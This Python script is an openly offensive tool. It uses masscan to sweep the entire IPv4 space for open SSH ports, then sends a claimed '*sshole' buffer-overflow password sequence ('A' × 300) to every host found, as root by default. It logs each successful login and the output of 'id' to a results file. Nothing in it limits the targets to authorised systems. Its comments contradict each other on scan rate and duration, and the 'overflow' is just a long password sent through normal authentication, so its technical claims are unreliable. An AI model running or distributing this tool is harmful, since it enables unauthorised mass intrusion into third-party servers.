"""
masscan + *sshole — Full IPv4 SSH Scanner & Exploiter
Scans 0.0.0.0/0 for open SSH (port 22) via masscan, then fires
the *sshole buffer-overflow PoC at every hit.  Successful logins
are appended to a text file and the scan continues.

Usage:
    python3 sshole_scan.py [user]
    # default user: root
"""

import json
import os
import queue
import signal
import socket
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# ──────────────────────────────────────────────
#  Configuration
# ──────────────────────────────────────────────
# ──────────────────────────────────────────────
#  Configuration
# ──────────────────────────────────────────────
SSH_PORT          = 22
SCAN_RATE         = 800_000           # pps (raise to 100k on 10 GbE)
MASSCAN_TIMEOUT   = 9000          # ~25 h — enough for a full /0 at 50 kpps
                                    # (set to 3600 if you only scan a /8, etc.)
MASSCAN_JSON      = "masscan_ssh_results.json"
MASSCAN_BIN       = "masscan"
CONCURRENCY       = 100
SSHOLE_PW_LONG    = "A" * 300
SSHOLE_TIMEOUT    = 10
OUTPUT_FILE       = "sshole_successes.txt"
PROGRESS_EVERY    = 200

# If you only want to scan a subset, override here (or pass as 2nd CLI arg):
#   "0.0.0.0/8"  → one octet (~16.7 M addresses, ~5 min at 50 kpps)
#   "0.0.0.0/0"  → full IPv4 (~4.3 B, ~24 h)
SCAN_RANGE = "0.0.0.0/0"
# ──────────────────────────────────────────────
#  Shared state
# ──────────────────────────────────────────────
result_lock   = threading.Lock()
successful    = []                  # list of (ip, port, id_output)
stop_event    = threading.Event()


# ──────────────────────────────────────────────
#  Masscan
# ──────────────────────────────────────────────
def run_masscan() -> str:
    """
    Run masscan and wait for the JSON results file.
    Lets masscan's own progress output go straight to the terminal
    (no pipe-buffer deadlock).
    """
    # Remove a stale results file so we can detect "new" output later
    if os.path.isfile(MASSCAN_JSON):
        os.remove(MASSCAN_JSON)

    cmd = [
        MASSCAN_BIN,
        SCAN_RANGE,
        f"-p{SSH_PORT}",
        f"--rate={SCAN_RATE}",
        f"--shard=1/1",
        f"--exclude",
        "255.255.255.255",
        "-oJ",              # ← split
        MASSCAN_JSON,       # ← into two elements
        
        # NOTE: no --wait  (the --timeout above already sizes the window)
    ]

    # masscan needs raw sockets → sudo on most systems
    if os.geteuid() != 0:
        cmd = ["sudo"] + cmd

    print(f"[*] {' '.join(cmd)}")
    print(f"[*] Expected duration ≈ {MASSCAN_TIMEOUT // 3600} h "
          f"({SCAN_RANGE}, {SCAN_RATE} pps)\n")

    try:
        # Inherit stdout/stderr so masscan prints live progress to the
        # terminal AND the pipe never fills up.
        proc = subprocess.run(cmd)
    except FileNotFoundError:
        sys.exit(
            "[!] 'masscan' not found.\n"
            "    Linux:  sudo apt install masscan\n"
            "    macOS:  brew install masscan\n"
            "    Source: https://github.com/robertdavidgraham/masscan"
        )

    if proc.returncode != 0:
        sys.exit(f"[!] masscan exited with code {proc.returncode}")

    if not os.path.isfile(MASSCAN_JSON):
        sys.exit(
            f"[!] masscan finished but {MASSCAN_JSON} was not created.\n"
            "    Try running the command manually to see the full output."
        )

    return MASSCAN_JSON

def parse_masscan(path: str) -> list[tuple[str, int]]:
    """Yield (ip, port) pairs from masscan's line-delimited JSON."""
    hosts: list[tuple[str, int]] = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
            except json.JSONDecodeError:
                continue
            ip  = obj.get("ip")
            ports = obj.get("ports", [])
            if not ip:
                continue
            for p in ports:
                if p.get("port") == SSH_PORT:
                    hosts.append((ip, SSH_PORT))
    # de-duplicate while preserving order
    seen: set[str] = set()
    unique: list[tuple[str, int]] = []
    for ip, port in hosts:
        if ip not in seen:
            seen.add(ip)
            unique.append((ip, port))
    return unique


# ──────────────────────────────────────────────
#  *sshole exploit  (paramiko one-shot)
# ──────────────────────────────────────────────
def attempt_sshole(host: str, port: int, user: str):
    """
    Try the two-password *sshole sequence:
      1. "wrong"          (normal, expected to fail)
      2. "A" * 300        (buffer-overflow attempt)
    Returns (bool, str)  →  (success, id_output)
    """
    sock = None
    transport = None
    try:
        sock = socket.create_connection((host, port), timeout=SSHOLE_TIMEOUT)
        transport = paramiko.Transport(sock)
        transport.start_client(timeout=SSHOLE_TIMEOUT)

        for pw in ("wrong", SSHOLE_PW_LONG):
            try:
                transport.auth_password(user, pw)
                # ── authenticated ──
                ch = transport.open_session()
                ch.exec_command("id")
                out = ch.makefile().read().decode().strip()
                return True, out
            except paramiko.AuthenticationException:
                continue

        return False, ""

    except (socket.timeout, socket.error, OSError):
        return False, ""
    except paramiko.SSHException:
        return False, ""
    except Exception:
        return False, ""
    finally:
        try:
            if transport:
                transport.close()
            if sock:
                sock.close()
        except Exception:
            pass


# ──────────────────────────────────────────────
#  Worker
# ──────────────────────────────────────────────
def _worker(ip: str, port: int, user: str):
    """Attempt the exploit; on success, record + print."""
    if stop_event.is_set():
        return
    ok, output = attempt_sshole(ip, port, user)
    if ok:
        with result_lock:
            successful.append((ip, port, output))
            with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
                f.write(f"{ip}:{port}\tuser={user}\tid={output}\n")
        print(f"\033[92m[+] SSHOLE  {ip}:{port}  id → {output}\033[0m",
              flush=True)


# ──────────────────────────────────────────────
#  Main driver
# ──────────────────────────────────────────────
def main():
    user = sys.argv[1] if len(sys.argv) > 1 else "root"

    def _sig_handler(signum, _frame):
        print(f"\n[*] Signal {signum} received — finishing in-flight attacks…")
        stop_event.set()

    signal.signal(signal.SIGINT,  _sig_handler)
    signal.signal(signal.SIGTERM, _sig_handler)

    banner = (
        "\n"
        "╔══════════════════════════════════════════════╗\n"
        "║   Masscan  +  *sshole   ·  IPv4 full-range    ║\n"
        "╚══════════════════════════════════════════════╝\n"
    )
    print(banner)
    print(f"  user        : {user}")
    print(f"  sshole pw   : 'wrong'  →  'A' × 300")
    print(f"  concurrency : {CONCURRENCY}")
    print(f"  output file : {OUTPUT_FILE}")
    print()

    # ── 1. discover ──────────────────────────
    t0 = time.monotonic()
    json_file = run_masscan()
    hosts = parse_masscan(json_file)
    t1 = time.monotonic()
    print(f"\n[*] Discovered {len(hosts)} hosts with open port {SSH_PORT} "
          f"({t1 - t0:.1f}s)\n")

    if not hosts:
        print("[*] Nothing to exploit. Done.")
        return

    # ── 2. exploit ───────────────────────────
    # Fresh output file
    open(OUTPUT_FILE, "w", encoding="utf-8").close()

    t2 = time.monotonic()
    completed = 0
    total     = len(hosts)

    print(f"[*] Firing *sshole at {total} hosts "
          f"({CONCURRENCY} threads) …\n", flush=True)

    with ThreadPoolExecutor(max_workers=CONCURRENCY) as pool:
        futures = {}
        for ip, port in hosts:
            if stop_event.is_set():
                break
            fut = pool.submit(_worker, ip, port, user)
            futures[fut] = ip

        for fut in as_completed(futures):
            completed += 1
            # progress heartbeat
            if completed % PROGRESS_EVERY == 0 or completed == total:
                pct = 100 * completed // total
                hits = len(successful)
                print(f"    ▸ {completed}/{total}  ({pct}%)   "
                      f"successes: {hits}", flush=True)
            # let exceptions inside the worker be swallowed
            try:
                fut.result()
            except Exception:
                pass

    t3 = time.monotonic()

    # ── 3. summary ───────────────────────────
    print("\n" + "═" * 44)
    print(f"  Hosts scanned   : {total}")
    print(f"  SSHOLE hits     : {len(successful)}")
    print(f"  Exploit time    : {t3 - t2:.1f}s")
    print(f"  Results file    : {OUTPUT_FILE}")
    if successful:
        print(f"\n  Successful IPs:")
        for ip, port, out in successful:
            print(f"    {ip}:{port}")
    print("═" * 44 + "\n")


# ──────────────────────────────────────────────
#  paramiko import guard (so the rest still runs
#  even if paramiko isn't installed yet)
# ──────────────────────────────────────────────
try:
    import paramiko  # noqa: F401
except ImportError:
    sys.exit("[!] pip install paramiko")

if __name__ == "__main__":
    main()
